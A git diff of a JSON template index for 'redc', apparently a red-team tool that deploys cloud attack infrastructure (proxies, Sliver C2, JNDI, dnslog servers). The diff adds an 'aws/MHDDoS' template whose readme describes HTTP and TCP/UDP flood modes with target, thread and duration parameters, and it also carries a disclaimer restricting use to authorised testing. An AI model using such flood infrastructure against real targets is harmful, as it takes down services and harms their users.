@@ -1,5 +1,5 @@
 {
-  "updated_at": "2026-02-26T01:41:01.781153Z",
+  "updated_at": "2026-03-05T12:21:13.621904Z",
   "repo_name": "redc-template-source",
   "templates": {
     "aliyun/ecs": {
@@ -7,13 +7,13 @@
       "provider": "aliyun",
       "slug": "ecs",
       "versions": {
-        "1.0.4": {
-          "url": "https://redc.zeoday.org/templates/aliyun_ecs_v1.0.4.zip",
-          "sha256": "5de453077eabac0e94a789c5ea97f0119bcf4b1afd5828a408f04baa482f49db",
-          "updated_at": "2026-02-26T01:41:01.744640Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aliyun_ecs_v1.0.5.zip",
+          "sha256": "de406c630ee7b1b38cc2d2f3ebd3a3e78f5dc0a6c3f480f0e0f91834e0317756",
+          "updated_at": "2026-03-05T12:21:13.572920Z"
         }
       },
-      "latest": "1.0.4",
+      "latest": "1.0.5",
       "metadata": {
         "name": "ecs",
         "author": "r0fus0d",
@@ -26,13 +26,13 @@
       "provider": "aliyun",
       "slug": "ecs1c2g",
       "versions": {
-        "1.0.4": {
-          "url": "https://redc.zeoday.org/templates/aliyun_ecs1c2g_v1.0.4.zip",
-          "sha256": "e827887bf1289688e9cb7ff719b9664d7c9ef19563dccc9287aec1e4cf0bbed5",
-          "updated_at": "2026-02-26T01:41:01.745892Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aliyun_ecs1c2g_v1.0.5.zip",
+          "sha256": "d6b2ffa28daaac995820c08a34f892d1b304fcbcba173354c0445aff5980bf93",
+          "updated_at": "2026-03-05T12:21:13.574564Z"
         }
       },
-      "latest": "1.0.4",
+      "latest": "1.0.5",
       "metadata": {
         "name": "ecs1c2g",
         "author": "r0fus0d",
@@ -45,13 +45,13 @@
       "provider": "aliyun",
       "slug": "file",
       "versions": {
-        "1.0.4": {
-          "url": "https://redc.zeoday.org/templates/aliyun_file_v1.0.4.zip",
-          "sha256": "ce3836b0891954377359f60a49c29e8bb9895977cc15dd88ae349c10261e4c4f",
-          "updated_at": "2026-02-26T01:41:01.746939Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aliyun_file_v1.0.5.zip",
+          "sha256": "7d2d787a85ccc0f66fa4df0b4acc6195c099950551a9e40d9705575e921af364",
+          "updated_at": "2026-03-05T12:21:13.575792Z"
         }
       },
-      "latest": "1.0.4",
+      "latest": "1.0.5",
       "metadata": {
         "name": "file",
         "author": "r0fus0d",
@@ -64,13 +64,13 @@
       "provider": "aliyun",
       "slug": "jndi",
       "versions": {
-        "1.0.4": {
-          "url": "https://redc.zeoday.org/templates/aliyun_jndi_v1.0.4.zip",
-          "sha256": "0eed852044a1a6f6a5c3d778da300c02fac9e64a8a9b88d8514c340b96a3fc57",
-          "updated_at": "2026-02-26T01:41:01.748042Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aliyun_jndi_v1.0.5.zip",
+          "sha256": "39d3d473388d291f830e0c06707670a3834740e75a80e0c00ff993e1a84c70fb",
+          "updated_at": "2026-03-05T12:21:13.577048Z"
         }
       },
-      "latest": "1.0.4",
+      "latest": "1.0.5",
       "metadata": {
         "name": "jndi",
         "author": "r0fus0d",
@@ -83,13 +83,13 @@
       "provider": "aliyun",
       "slug": "proxy",
       "versions": {
-        "1.0.9": {
-          "url": "https://redc.zeoday.org/templates/aliyun_proxy_v1.0.9.zip",
-          "sha256": "1a4307244419a810e40eab114209c3d8f7933f1fd8da32f0b7fd50616bf9db15",
-          "updated_at": "2026-02-26T01:41:01.749191Z"
+        "1.1.1": {
+          "url": "https://redc.zeoday.org/templates/aliyun_proxy_v1.1.1.zip",
+          "sha256": "10eb667964b94a67ccdf9e476b3052fbcf0df0adf8e7606fd2be83f42fb86936",
+          "updated_at": "2026-03-05T12:21:13.578317Z"
         }
       },
-      "latest": "1.0.9",
+      "latest": "1.1.1",
       "metadata": {
         "name": "proxy",
         "author": "r0fus0d",
@@ -102,13 +102,13 @@
       "provider": "aliyun",
       "slug": "sliver",
       "versions": {
-        "1.0.4": {
-          "url": "https://redc.zeoday.org/templates/aliyun_sliver_v1.0.4.zip",
-          "sha256": "355bd69269731ac14254c3660fb7d1c8c457c068510b9464406418ee27bbd1b9",
-          "updated_at": "2026-02-26T01:41:01.750257Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aliyun_sliver_v1.0.5.zip",
+          "sha256": "9103b165f06dbacf223ec71238d59ffc309e7e5b459b55d8475bf08eb8227c48",
+          "updated_at": "2026-03-05T12:21:13.579544Z"
         }
       },
-      "latest": "1.0.4",
+      "latest": "1.0.5",
       "metadata": {
         "name": "sliver",
         "author": "r0fus0d",
@@ -121,13 +121,13 @@
       "provider": "aliyun",
       "slug": "yakit",
       "versions": {
-        "1.0.3": {
-          "url": "https://redc.zeoday.org/templates/aliyun_yakit_v1.0.3.zip",
-          "sha256": "79c647e942f5d7740132ded87fa467129c9155e55e1884d7f4b8c6a3b7884fad",
-          "updated_at": "2026-02-26T01:41:01.751312Z"
+        "1.0.4": {
+          "url": "https://redc.zeoday.org/templates/aliyun_yakit_v1.0.4.zip",
+          "sha256": "807ac87112c2f819fdf0ef41a29b277d4afc52c08bdd62e9bd52d6db32123d13",
+          "updated_at": "2026-03-05T12:21:13.580861Z"
         }
       },
-      "latest": "1.0.3",
+      "latest": "1.0.4",
       "metadata": {
         "name": "yakit",
         "author": "r0fus0d",
@@ -135,18 +135,37 @@
         "readme": "# 场景使用\n\n1. 使用前请按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull aliyun/yakit\n```\n\n开启\n```\nredc run aliyun/yakit\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n3. 部署完成后，可以通过以下方式连接 yakit 服务器：\n   - 使用 yakit 客户端连接到服务器 IP 的 8087 端口（默认）\n   - SSH 登录到服务器：`ssh root@<服务器IP>`，密码在 `redc status` 输出中\n\n# 静态资源\n\n本场景中 yakit 服务端（yak）从阿里云 OSS 存储桶直接下载，无需配置 GitHub 代理。\n\n下载链接：https://yaklang.oss-cn-beijing.aliyuncs.com/yak/latest/yak_linux_amd64\n\n如需更换版本或下载地址，可在 main.tf 的 user_data 部分修改下载链接。\n\n# 注意事项\n\n**端口配置**\n\n默认 yakit 服务端监听端口为 8087，可以通过修改 `terraform.tfvars` 中的 `yakit_port` 参数来自定义端口。\n\n```\nyakit_port = 8087\n```\n\n或在运行时通过 `-e` 参数指定：\n```\nredc run aliyun/yakit -e yakit_port=9999\n```\n\n**实例规格**\n\n本场景使用 ecs.c7a.large 规格（2核4G），如果该规格在某些地区不可用或售罄，可以修改 main.tf 中的 `instance_type` 为其他规格，例如：\n- ecs.n1.small (1核2G)\n- ecs.c7.large (2核4G)\n- ecs.g7.large (2核8G)\n\n**区域配置**\n\n默认部署在北京地区 (cn-beijing)，可以在 versions.tf 中修改 `region` 参数来更改部署区域。\n\n若启动场景报错，可能原因：\n1. 阿里云账户余额不足 (需要大于 200)\n2. 与阿里云 API 网络连接超时\n3. 阿里云该区域售罄或下架 instance_type 的配置机型\n4. yakit 服务启动失败，可登录服务器查看日志：`systemctl status yakit`\n5. OSS 下载链接失效或网络问题导致无法下载 yak 二进制文件\n"
       }
     },
+    "aws/MHDDoS": {
+      "id": "aws/MHDDoS",
+      "provider": "aws",
+      "slug": "MHDDoS",
+      "versions": {
+        "0.0.1": {
+          "url": "https://redc.zeoday.org/templates/aws_MHDDoS_v0.0.1.zip",
+          "sha256": "19572173fa26f10527b33e489202843aebf95d9a6dfff0f253d4d9a69e63f29c",
+          "updated_at": "2026-03-05T12:21:13.582037Z"
+        }
+      },
+      "latest": "0.0.1",
+      "metadata": {
+        "name": "MHDDoS",
+        "author": "r0fus0d",
+        "description": "MHDDoS 分布式拒绝服务攻击工具，支持多种攻击模式（SOCKS5 代理、TCP、UDP、HTTP 等），适用于渗透测试场景，慎用，价格昂贵,1T 1k",
+        "readme": "# 场景使用\n\n1. 使用前请 **一定** 按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull aws/MHDDoS\n```\n\n开启\n```\nredc run aws/MHDDoS\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n# 参数说明\n\n| 参数 | 说明 | 默认值 |\n|------|------|--------|\n| node | 节点数量 | 1 |\n| ddos_target | 攻击目标 (IP 或域名) | - |\n| ddos_threads | 攻击线程数 | 100 |\n| ddos_time | 攻击持续时间 (秒) | 3600 |\n| ddos_mode | 攻击模式 (layer7/layer4) | layer7 |\n\n# 攻击模式说明\n\n- **layer7**: HTTP Flood, GET/POST 洪水攻击\n- **layer4**: TCP/UDP 洪水攻击\n\n# 注意事项\n\n**区域配置**\n\naws 开启 ap-east-1 (香港) 区域\n\n![](../../img/redc-2.png)\n\n![](../../img/redc-3.png)\n\n**使用限制**\n\n本工具仅供 **授权的渗透测试** 使用，未经目标授权的 DDoS 攻击是违法行为。\n\n若启动场景报错，可能原因\n1. 与 aws api 网络连接超时\n2. aws 该区域售罄或下架 instance_type 的配置机型\n3. AMI 架构与 instance_type 不匹配\n"
+      }
+    },
     "aws/dnslog": {
       "id": "aws/dnslog",
       "provider": "aws",
       "slug": "dnslog",
       "versions": {
-        "1.0.9": {
-          "url": "https://redc.zeoday.org/templates/aws_dnslog_v1.0.9.zip",
-          "sha256": "cc056842ffc8f7e2c4475c2b9ee1fa0785fdcfc27981df38f8915f8d14cd3cdc",
-          "updated_at": "2026-02-26T01:41:01.752467Z"
+        "1.1.0": {
+          "url": "https://redc.zeoday.org/templates/aws_dnslog_v1.1.0.zip",
+          "sha256": "e34905f35a61b4cbe67c5dfd86fd90284c3f96d444440fcaa40ff96d0402ec2b",
+          "updated_at": "2026-03-05T12:21:13.583288Z"
         }
       },
-      "latest": "1.0.9",
+      "latest": "1.1.0",
       "metadata": {
         "name": "dnslog",
         "author": "r0fus0d",
@@ -159,13 +178,13 @@
       "provider": "aws",
       "slug": "docker",
       "versions": {
-        "1.0.5": {
-          "url": "https://redc.zeoday.org/templates/aws_docker_v1.0.5.zip",
-          "sha256": "a1225d4036817ea35997c990bebf46c6112410d0576597f3125e33eca6420ef1",
-          "updated_at": "2026-02-26T01:41:01.753287Z"
+        "1.0.6": {
+          "url": "https://redc.zeoday.org/templates/aws_docker_v1.0.6.zip",
+          "sha256": "fb36ed17d4f0c92fe09c9eebdd9757eaa9b0b5c377e1d8c0c101846e44aa6095",
+          "updated_at": "2026-03-05T12:21:13.584224Z"
         }
       },
-      "latest": "1.0.5",
+      "latest": "1.0.6",
       "metadata": {
         "name": "docker",
         "author": "r0fus0d",
@@ -178,13 +197,13 @@
       "provider": "aws",
       "slug": "ec2",
       "versions": {
-        "1.0.3": {
-          "url": "https://redc.zeoday.org/templates/aws_ec2_v1.0.3.zip",
-          "sha256": "9f2625d482e2109d1cce08475719eb0aac6c88c7c09fe51c4f08c12263d28427",
-          "updated_at": "2026-02-26T01:41:01.754100Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aws_ec2_v1.0.5.zip",
+          "sha256": "6fabb10f31f316aa2dcd4edcc899107d66131a73a0d37b55fdbebec72fda4770",
+          "updated_at": "2026-03-05T12:21:13.585237Z"
         }
       },
-      "latest": "1.0.3",
+      "latest": "1.0.5",
       "metadata": {
         "name": "ec2",
         "author": "r0fus0d",
@@ -197,13 +216,13 @@
       "provider": "aws",
       "slug": "ec2-1G",
       "versions": {
-        "1.0.4": {
-          "url": "https://redc.zeoday.org/templates/aws_ec2-1G_v1.0.4.zip",
-          "sha256": "e5b59b7dff2617436658b1dbf007997b3a2a41e44609109a7c730e9e79c583c7",
-          "updated_at": "2026-02-26T01:41:01.754890Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aws_ec2-1G_v1.0.5.zip",
+          "sha256": "753311c107c2b12e2a45e5dc25817704c7366554aa6176c3cbed28ba18bca7f9",
+          "updated_at": "2026-03-05T12:21:13.586177Z"
         }
       },
-      "latest": "1.0.4",
+      "latest": "1.0.5",
       "metadata": {
         "name": "ec2-1G",
         "author": "r0fus0d",
@@ -216,13 +235,13 @@
       "provider": "aws",
       "slug": "ec2-4G",
       "versions": {
-        "1.0.4": {
-          "url": "https://redc.zeoday.org/templates/aws_ec2-4G_v1.0.4.zip",
-          "sha256": "ddbdea11bebf14081bf28dfb4058a9eb3a4b2057fef7e919548af9055fe71275",
-          "updated_at": "2026-02-26T01:41:01.755701Z"
+        "1.0.5": {
+          "url": "https://redc.zeoday.org/templates/aws_ec2-4G_v1.0.5.zip",
+          "sha256": "a1a93c08075440c73a6f6f31a13ef35319bbe20b03d42384d5c4da31a9985d3c",
+          "updated_at": "2026-03-05T12:21:13.587073Z"
         }
       },
-      "latest": "1.0.4",
+      "latest": "1.0.5",
       "metadata": {
         "name": "ec2-4G",
         "author": "r0fus0d",
@@ -235,13 +254,13 @@
       "provider": "aws",
       "slug": "interactsh",
       "versions": {
-        "1.0.8": {
-          "url": "https://redc.zeoday.org/templates/aws_interactsh_v1.0.8.zip",
-          "sha256": "214464b50a81000213c7216237e1db9108433fc1ac6af75324d55d33add74110",
-          "updated_at": "2026-02-26T01:41:01.756679Z"
+        "1.0.9": {
+          "url": "https://redc.zeoday.org/templates/aws_interactsh_v1.0.9.zip",
+          "sha256": "b3bab15eff7af6313150f950e3cdbe4276ad71daf5be53f7a2c2bd605ac85309",
+          "updated_at": "2026-03-05T12:21:13.588197Z"
         }
       },
-      "latest": "1.0.8",
+      "latest": "1.0.9",
       "metadata": {
         "name": "interactsh",
         "author": "r0fus0d",
@@ -254,13 +273,13 @@
       "provider": "aws",
       "slug": "md",
       "versions": {
-        "1.0.5": {
-          "url": "https://redc.zeoday.org/templates/aws_md_v1.0.5.zip",
-          "sha256": "284554b468f378264aa62081a1791261b1cf16f7551810201f9914813a51c367",
-          "updated_at": "2026-02-26T01:41:01.757665Z"
+        "1.0.6": {
+          "url": "https://redc.zeoday.org/templates/aws_md_v1.0.6.zip",
+          "sha256": "8e8fbc401f81cbac2b8cb259465e424fe33877e5f2b959718974020b8d739432",
+          "updated_at": "2026-03-05T12:21:13.589354Z"
         }
       },
-      "latest": "1.0.5",
+      "latest": "1.0.6",
       "metadata": {
         "name": "md",
         "author": "r0fus0d",
@@ -273,18 +292,37 @@
       "provider": "aws",
       "slug": "proxy",
       "versions": {
-        "1.1.2": {
-          "url": "https://redc.zeoday.org/templates/aws_proxy_v1.1.2.zip",
-          "sha256": "a2f089c811d3d1f7305b665e70dbc528d1c96f66e8f92dd0c8da20f39ba10203",
-          "updated_at": "2026-02-26T01:41:01.758762Z"
+        "1.1.4": {
+          "url": "https://redc.zeoday.org/templates/aws_proxy_v1.1.4.zip",
+          "sha256": "4104732578e832b51f9ab4902085f4985e8da62585530878a3f530888f2b36df",
+          "updated_at": "2026-03-05T12:21:13.590582Z"
         }
       },
-      "latest": "1.1.2",
+      "latest": "1.1.4",
       "metadata": {
         "name": "proxy",
         "author": "r0fus0d",
-        "description": "AWS 多节点代理场景，ap-east-1 区域，默认 t4g.nano 节点（shadowsocks-libev），支持 R2 上传 clash 配置",
+        "description": "AWS 多节点代理场景，ap-east-1 区域，默认 10 台 t4g.nano 节点（shadowsocks-libev），支持 R2 上传 clash 配置",
         "readme": "# 场景使用\n\n1. 使用前请 **一定** 按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull aws/proxy\n```\n\n开启\n```\n# 默认 10 台\nredc run aws/proxy\n\n# 通过 -e 参数，进行自定义节点数量,比如开 10 个节点\nredc run aws/proxy -e node=10\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n3. 如果未配置 r2 上传，可以在本地查看 clash 的配置文件\n\n# 注意事项\n\n**r2 配置**\n\ndeploy.sh 中的 upload_to_r2 函数负责将 clash 配置传至 r2\n\n请自行安装 rclone 并设置 rclone 与 r2 的配置\n- https://github.com/rclone/rclone/releases\n- https://dash.cloudflare.com/ 的 r2\n\n![](../../img/redc-1.png)\n\n```\nrclone config\ns3\nCloudflare R2 Storage\nxxxxxxxxxxxxx\nxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\nhttps://xxxxxxxxxxxxxxxxxx.r2.cloudflarestorage.com\nauto\n\nrclone lsf r2:test\n```\n\n**可自行替换 deploy.sh 中 upload_to_r2 函数的配置下载地址**\n\n对应\n```\necho \"url : https://这里改成你的 r2 地址/proxyfile/aws-config.yaml\"\n```\n\n**区域配置**\n\naws 开启 ap-east-1 (香港) 区域\n\n![](../../img/redc-2.png)\n\n![](../../img/redc-3.png)\n\n若启动场景报错，可能原因\n1. 与 aws api 网络连接超时\n2. aws 该区域售罄或下架 instance_type 的配置机型\n3. AMI 架构与 instance_type 不匹配\n4. rclone配置不正确\n5. r2 存储桶名称和配置不一致\n"
+      }
+    },
+    "azure/vm": {
+      "id": "azure/vm",
+      "provider": "azure",
+      "slug": "vm",
+      "versions": {
+        "0.0.2": {
+          "url": "https://redc.zeoday.org/templates/azure_vm_v0.0.2.zip",
+          "sha256": "a9c931eaf4734aec2100a57a1bfd9285b33c76d5a3dffe4c055c7f5670f5e49e",
+          "updated_at": "2026-03-05T12:21:13.591648Z"
+        }
+      },
+      "latest": "0.0.2",
+      "metadata": {
+        "name": "vm",
+        "author": "r0fus0d",
+        "description": "Azure VM 实例，该场景测试由于配额问题未跑通，仅记录参考",
+        "readme": "# 场景使用\n\n1. 使用前请 **一定** 按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull azure/vm\n```\n\n开启\n```\nredc run azure/vm\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n# 注意事项\n\n**Azure 凭据配置**\n\n需要配置 Azure 服务凭据，详见 [redc 凭据管理](../../README_CN.md#azure-配置)\n\n```yaml\n# ~/redc/config.yaml\nproviders:\n  azure:\n    ARM_CLIENT_ID: \"your-client-id\"\n    ARM_CLIENT_SECRET: \"your-client-secret\"\n    ARM_SUBSCRIPTION_ID: \"your-subscription-id\"\n    ARM_TENANT_ID: \"your-tenant-id\"\n```\n\n**区域说明**\n\n默认使用 `West Europe`（西欧洲）区域\n\n**配额问题**\n\nAzure 创建虚拟机需要满足以下条件：\n\n1. **区域配额**：目标区域需要有可用的 vCPU 配额\n2. **SKU 可用性**：所选 VM 规格在该区域需要有可用容量\n\n如遇到以下错误：\n- `SkuNotAvailable`: VM 规格在当前区域不可用 → 更换 `vm_size` 或 `location`\n- `quota exceeded`: vCPU 配额不足 → 在 Azure 门户申请增加配额，或更换区域\n\n**默认配置**\n\n| 参数 | 默认值 |\n|------|--------|\n| VM 规格 | Standard_D2a_v4 |\n| 区域 | West Europe |\n| 系统镜像 | Ubuntu 18.04 LTS |\n| 用户名 | redcadmin |\n| 密码 | 自动生成 |\n\n**自定义参数**\n\n可以通过 `terraform.tfvars` 覆盖默认配置：\n\n```hcl\ninstance_password = \"YourPassword123\"\n```\n"
       }
     },
     "base-templates/alicloud-ecs": {
@@ -292,13 +330,13 @@
       "provider": "base-templates",
       "slug": "alicloud-ecs",
       "versions": {
-        "1.0.6": {
-          "url": "https://redc.zeoday.org/templates/base-templates_alicloud-ecs_v1.0.6.zip",
-          "sha256": "3f6df4630aa107f06b1f1c44c22eeefec03c25d21fe297f977a0ec3d745e791c",
-          "updated_at": "2026-02-26T01:41:01.759851Z"
+        "1.0.7": {
+          "url": "https://redc.zeoday.org/templates/base-templates_alicloud-ecs_v1.0.7.zip",
+          "sha256": "e26c6bf551147c01f7ad25f5b85182fcb6315111dbe63b9abee38bc3b01f242a",
+          "updated_at": "2026-03-05T12:21:13.592893Z"
         }
       },
-      "latest": "1.0.6",
+      "latest": "1.0.7",
       "metadata": {
         "name": "alicloud-ecs",
         "author": "redc",
@@ -311,13 +349,13 @@
       "provider": "base-templates",
       "slug": "volcengine-ecs",
       "versions": {
-        "1.0.5": {
-          "url": "https://redc.zeoday.org/templates/base-templates_volcengine-ecs_v1.0.5.zip",
-          "sha256": "030546b3c31d89d2a6a0a9be73e2cdc34f154bf4f2825fe2eb070b12108114e2",
-          "updated_at": "2026-02-26T01:41:01.760928Z"
+        "1.0.6": {
+          "url": "https://redc.zeoday.org/templates/base-templates_volcengine-ecs_v1.0.6.zip",
+          "sha256": "1c468ba617aaaa357adcc1c9fdfc0689e91042f9c4dfaa2a184f8295e565e951",
+          "updated_at": "2026-03-05T12:21:13.594048Z"
         }
       },
-      "latest": "1.0.5",
+      "latest": "1.0.6",
       "metadata": {
         "name": "volcengine-ecs",
         "author": "redc",
@@ -330,13 +368,13 @@
       "provider": "compose-templates",
       "slug": "compose-example",
       "versions": {
-        "1.0.1": {
-          "url": "https://redc.zeoday.org/templates/compose-templates_compose-example_v1.0.1.zip",
-          "sha256": "f7e6f89f59339e44f0e7ef4bd0514a1909c86cad6df954a80ed2ffc79575f2ae",
-          "updated_at": "2026-02-26T01:41:01.761473Z"
+        "1.0.2": {
+          "url": "https://redc.zeoday.org/templates/compose-templates_compose-example_v1.0.2.zip",
+          "sha256": "c4c9a3342bb5c447c59e10d02beb27b5ba6807226e92f20aea13c5bd71b28e5a",
+          "updated_at": "2026-03-05T12:21:13.594712Z"
         }
       },
-      "latest": "1.0.1",
+      "latest": "1.0.2",
       "metadata": {
         "name": "compose-example",
         "author": "r0fus0d",
@@ -349,13 +387,13 @@
       "provider": "ctyun",
       "slug": "ecs",
       "versions": {
-        "1.0.0": {
-          "url": "https://redc.zeoday.org/templates/ctyun_ecs_v1.0.0.zip",
-          "sha256": "2c9497687c1ab0dca46827a8b8be55cf41313f70c5459a5e9d1ad6d71327ddef",
-          "updated_at": "2026-02-26T01:41:01.762411Z"
+        "1.0.3": {
+          "url": "https://redc.zeoday.org/templates/ctyun_ecs_v1.0.3.zip",
+          "sha256": "71ec47b7aea7aecfc80d48350664e9879815f26bc3426ef87b63a9f719f8a2be",
+          "updated_at": "2026-03-05T12:21:13.595888Z"
         }
       },
-      "latest": "1.0.0",
+      "latest": "1.0.3",
       "metadata": {
         "name": "ecs",
         "author": "r0fus0d",
@@ -363,18 +401,37 @@
         "readme": "# 天翼云 ECS 场景\n\n使用 Terraform 在天翼云创建 ECS 实例。\n\n## 使用方法\n\n### 1. 拉取场景\n\n```bash\nredc pull ctyun/ecs\ncd ctyun/ecs\n```\n\n### 2. 配置凭据\n\n在 `config.yaml` 中配置天翼云凭据：\n\n```yaml\nproviders:\n  ctyun:\n    access_key: \"your_access_key\"\n    secret_key: \"your_secret_key\"\n    region: \"cn-gd\"\n```\n\n或者通过环境变量：\n\n```bash\nexport CTYUN_ACCESS_KEY=\"your_access_key\"\nexport CTYUN_SECRET_KEY=\"your_secret_key\"\n```\n\n### 3. 自定义配置（可选）\n\n编辑 `terraform.tfvars` 修改默认配置：\n\n```hcl\ninstance_name  = \"my-ecs\"\ninstance_type = \"s3.medium.2\"\nregion        = \"cn-gd\"\n```\n\n### 4. 运行场景\n\n```bash\nredc run ctyun/ecs\n```\n\n### 5. 查看状态\n\n```bash\nredc status\n```\n\n### 6. 停止并销毁\n\n```bash\nredc stop\n```\n\n## 变量说明\n\n| 变量 | 默认值 | 说明 |\n|------|--------|------|\n| `region` | cn-gd | 区域，如 cn-gd, cn-sh |\n| `instance_name` | redc-ecs | 实例名称 |\n| `instance_type` | s3.medium.1 | 实例规格 |\n| `image_id` | (空) | 镜像 ID，留空则使用默认 |\n| `password` | (自动生成) | 实例密码 |\n\n## 输出说明\n\n| 输出 | 说明 |\n|------|------|\n| `instance_id` | 实例 ID |\n| `instance_name` | 实例名称 |\n| `private_ip` | 内网 IP |\n| `ssh_user` | SSH 用户名 |\n| `ssh_password` | SSH 密码 |\n\n## 常用区域\n\n- `cn-gd` - 广东\n- `cn-sh` - 上海\n- `cn-bj` - 北京\n\n## 注意事项\n\n1. 确保天翼云账户余额充足\n2. 实例规格和区域可根据需要调整\n"
       }
     },
+    "gcp/compute_instance": {
+      "id": "gcp/compute_instance",
+      "provider": "gcp",
+      "slug": "compute_instance",
+      "versions": {
+        "1.0.2": {
+          "url": "https://redc.zeoday.org/templates/gcp_compute_instance_v1.0.2.zip",
+          "sha256": "1490aa9c6413c7a19cdfc7861962c2bb68aff939989bb018c4a3c8322102ce58",
+          "updated_at": "2026-03-05T12:21:13.596897Z"
+        }
+      },
+      "latest": "1.0.2",
+      "metadata": {
+        "name": "compute_instance",
+        "author": "r0fus0d",
+        "description": "GCP Compute Engine 实例，us-central1 区域，默认 e2-micro 实例，可自定义实例类型、镜像等参数",
+        "readme": "# 场景使用\n\n1. 使用前请 **一定** 按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull gcp/compute_instance\n```\n\n开启\n```\nredc run gcp/compute_instance\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n# 注意事项\n\n**GCP 凭据配置**\n\n需要配置 GCP 服务账号 JSON 凭据文件路径，详见 [redc 凭据管理](../../README_CN.md#gcp-配置)\n\n```yaml\n# ~/redc/config.yaml\nproviders:\n  google:\n    GOOGLE_APPLICATION_CREDENTIALS: \"/path/to/your-service-account.json\"\n    project: \"your-project-id\"\n    region: \"us-central1\"\n```\n\n**区域配置**\n\n默认使用 us-central1 (爱荷华) 区域\n\n若启动场景报错，可能原因\n1. 与 GCP API 网络连接超时\n2. GCP 项目未启用 Compute Engine API\n3. 服务账号权限不足\n4. 该区域无可用资源\n"
+      }
+    },
     "huaweicloud/nps": {
       "id": "huaweicloud/nps",
       "provider": "huaweicloud",
       "slug": "nps",
       "versions": {
-        "0.0.5": {
-          "url": "https://redc.zeoday.org/templates/huaweicloud_nps_v0.0.5.zip",
-          "sha256": "da34ae8f9dc1e82280ae2040f8eca790aa55d6ad0a17997fbe915639cddd5877",
-          "updated_at": "2026-02-26T01:41:01.763648Z"
+        "0.0.6": {
+          "url": "https://redc.zeoday.org/templates/huaweicloud_nps_v0.0.6.zip",
+          "sha256": "7f6d938ec8223faca390d9c82faf9b186c516b16ba38b0ca48568c68d6095d5b",
+          "updated_at": "2026-03-05T12:21:13.598254Z"
         }
       },
-      "latest": "0.0.5",
+      "latest": "0.0.6",
       "metadata": {
         "name": "nps",
         "author": "r0fus0d",
@@ -387,18 +444,18 @@
       "provider": "tencent",
       "slug": "cvm",
       "versions": {
-        "1.0.3": {
-          "url": "https://redc.zeoday.org/templates/tencent_cvm_v1.0.3.zip",
-          "sha256": "fb4c1cd81b30845b4916b996deb1d3b76862de13a0532a005ffa7ad0fb30366d",
-          "updated_at": "2026-02-26T01:41:01.764728Z"
+        "1.0.4": {
+          "url": "https://redc.zeoday.org/templates/tencent_cvm_v1.0.4.zip",
+          "sha256": "99de0c55ead59101556d2a47111a49fc8fd5c3cace5149ee15c6bdd4d472b593",
+          "updated_at": "2026-03-05T12:21:13.599433Z"
         }
       },
-      "latest": "1.0.3",
+      "latest": "1.0.4",
       "metadata": {
         "name": "cvm",
         "author": "r0fus0d",
-        "description": "在腾讯云快速部署一台配置完善的CVM云服务器实例，自动安装常用开发工具（wget、curl、lrzsz、tmux等）和Python3环境，开放全部端口，适用于临时测试、开发调试或攻防演练等场景",
-        "readme": "# 场景使用\n\n1. 使用前请按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull tencent/jndi\n```\n\n开启\n```\nredc run tencent/jndi\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n# 静态资源\n\n**非 redc 使用请自行替换 terraform.tfvars 中的 腾讯云 aksk**\n\n```\ntencentcloud_secret_id  = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\ntencentcloud_secret_key = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n```\n\n# 注意事项\n\n若启动场景报错，可能原因\n1. 腾讯云账户余额不足\n2. 与腾讯云 api 网络连接超时\n3. 腾讯云该区域售罄或下架 instance_type 的配置机型\n"
+        "description": "在腾讯云快速部署一台配置完善的CVM云服务器实例，自动安装常用开发工具（wget、curl、lrzsz、tmux等）和Python3环境，开放全部端口，适用于临时测试，开发调试或攻防演练等场景",
+        "readme": "# 场景使用\n\n1. 使用前请按照注意事项里内容进行配置 (若空则无需配置)\n2. 使用时命令如下\n\n拉取\n```\nredc pull tencent/cvm\n```\n\n开启\n```\nredc run tencent/cvm\n```\n\n查询\n```\nredc status [uuid]\n```\n\n关闭\n```\nredc stop [uuid]\n```\n\n# 静态资源\n\n**非 redc 使用请自行替换 terraform.tfvars 中的 腾讯云 aksk**\n\n```\ntencentcloud_secret_id  = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\ntencentcloud_secret_key = \"xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx\"\n```\n\n# 注意事项\n\n若启动场景报错，可能原因\n1. 腾讯云账户余额不足\n2. 与腾讯云 api 网络连接超时\n3. 腾讯云该区域售罄或下架 instance_type 的配置机型\n"
       }
     },
     "tencent/file": {
@@ -406,13 +463,13 @@
       "provider": "tencent",
       "slug": "file",
       "versions": {
-        "1.0.5": {
-          "url": "https://redc.zeoday.org/templates/tencent_file_v1.0.5.zip",
-          "sha256": "a817cdc27e0982563eab27db926880376eb97f51f0cc611920e9d613a49020c7",
-          "updated_at": "2026-02-26T01:41:01.765742Z"
+        "1.0.6": {
+          "url": "https://redc.zeoday.org/templates/tencent_file_v1.0.6.zip",
